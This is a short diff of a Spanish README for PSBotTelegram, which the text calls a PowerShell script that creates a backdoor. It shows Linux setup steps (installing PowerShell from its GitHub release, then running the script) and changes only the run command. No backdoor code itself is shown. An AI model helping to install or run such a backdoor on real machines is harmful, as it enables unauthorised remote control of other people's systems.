@@ -25,7 +25,7 @@ PSBotTelegram es un script escrito en Powershell, que nos crea una backdoor que 
     sudo apt-get install libunwind8 libicu55 
     wget https://github.com/PowerShell/PowerShell/releases/download/v6.0.0-alpha.13/powershell_6.0.0-alpha.13-1ubuntu1.16.04.1_amd64.deb
     sudo dpkg -i powershell_6.0.0-alpha.13-1ubuntu1.16.04.1_amd64.deb
-    powershell.exe ./PSBotelegram.ps1
+    powershell ./PSBotelegram.ps1
 
 # Instalación en Windows
 
